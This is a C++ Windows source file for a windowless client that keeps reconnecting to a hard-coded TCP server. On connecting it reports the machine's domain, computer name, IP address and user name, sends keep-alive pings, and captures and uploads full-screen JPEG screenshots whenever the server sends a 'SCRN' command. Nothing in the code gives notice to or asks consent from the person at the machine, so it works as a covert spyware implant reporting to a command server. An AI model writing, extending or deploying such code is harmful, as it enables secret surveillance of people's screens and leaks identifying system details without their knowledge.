#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <thread>
#include <iostream>
#include <vector>
#include <iphlpapi.h>
#include <lm.h>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "iphlpapi.lib")

using namespace Gdiplus;

const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 12345;
bool running = true;

std::string GetComputerName() {
    char buffer[256]{};
    DWORD size = sizeof(buffer);
    ::GetComputerNameA(buffer, &size);
    return buffer;
}

std::string GetUserName() {
    char buffer[256]{};
    DWORD size = sizeof(buffer);
    ::GetUserNameA(buffer, &size);
    return buffer;
}

std::string GetDomainName() {
    char buffer[256]{};
    DWORD size = sizeof(buffer);
    if (GetComputerNameExA(ComputerNameDnsDomain, buffer, &size) && buffer[0] != '\0') {
        return buffer;
    }
    return "WORKGROUP";
}

std::string GetLocalIP() {
    PIP_ADAPTER_INFO adapterInfo;
    ULONG bufferSize = 0;
    
    if (GetAdaptersInfo(nullptr, &bufferSize) == ERROR_BUFFER_OVERFLOW) {
        adapterInfo = (PIP_ADAPTER_INFO)malloc(bufferSize);
        if (GetAdaptersInfo(adapterInfo, &bufferSize) == ERROR_SUCCESS) {
            for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != nullptr; adapter = adapter->Next) {
                if (adapter->IpAddressList.IpAddress.String[0] != '0') {
                    std::string ip = adapter->IpAddressList.IpAddress.String;
                    free(adapterInfo);
                    return ip;
                }
            }
        }
        free(adapterInfo);
    }
    return "127.0.0.1";
}

bool TakeScreenshot(std::vector<BYTE>& jpegData) {
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    HDC hdcScreen = GetDC(nullptr);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    IStream* stream = nullptr;
    CreateStreamOnHGlobal(nullptr, TRUE, &stream);

    CLSID clsidJpeg;
    CLSIDFromString(L"{557CF401-1A04-11D3-9A73-0000F81EF32E}", &clsidJpeg); // CLSID для JPEG
    bitmap.Save(stream, &clsidJpeg, nullptr);

    STATSTG stat;
    stream->Stat(&stat, STATFLAG_NONAME);
    jpegData.resize(stat.cbSize.LowPart);
    LARGE_INTEGER seekPos = {0};
    stream->Seek(seekPos, STREAM_SEEK_SET, nullptr);
    stream->Read(jpegData.data(), jpegData.size(), nullptr);

    stream->Release();
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);
    Gdiplus::GdiplusShutdown(gdiplusToken);
    return true;
}
void SendScreenshot(SOCKET sock) {
    std::vector<BYTE> imageData;
    if (TakeScreenshot(imageData)) {
        char header[8];
        memcpy(header, "SCRN", 4);
        *(int*)(header + 4) = imageData.size();
        send(sock, header, 8, 0);
        send(sock, reinterpret_cast<const char*>(imageData.data()), imageData.size(), 0);
    }
}

void KeepAliveLoop(SOCKET sock) {
    while (running) {
        send(sock, "PING", 4, 0);
        std::this_thread::sleep_for(std::chrono::seconds(30));
    }
}

void MessageHandler(SOCKET sock) {
    char buffer[4096];
    while (running) {
        int bytes = recv(sock, buffer, sizeof(buffer), 0);
/*        if (bytes <= 0) {
            running = false;
            break;
        }
*/        
        if (bytes >= 4 && strncmp(buffer, "SCRN", 4) == 0) {
            SendScreenshot(sock);
        }
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    while (running) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sockaddr_in serverAddr{};
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(SERVER_PORT);
        inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);

        if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(sock);
            std::this_thread::sleep_for(std::chrono::seconds(5)); // Ждём 5 секунд перед повторной попыткой
            continue;
        }

        std::string clientInfo = GetDomainName() + "|" + GetComputerName() + "|" + GetLocalIP() + "|" + GetUserName();
        send(sock, clientInfo.c_str(), clientInfo.size() + 1, 0);

        std::thread keepAlive(KeepAliveLoop, sock);
        std::thread handler(MessageHandler, sock);
        keepAlive.detach();
        handler.detach();

        MSG msg;
        while (running && GetMessage(&msg, nullptr, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        closesocket(sock);
        std::this_thread::sleep_for(std::chrono::seconds(1)); // Задержка перед переподключением
    }
    WSACleanup();
    GdiplusShutdown(gdiplusToken);
    return 0;
}
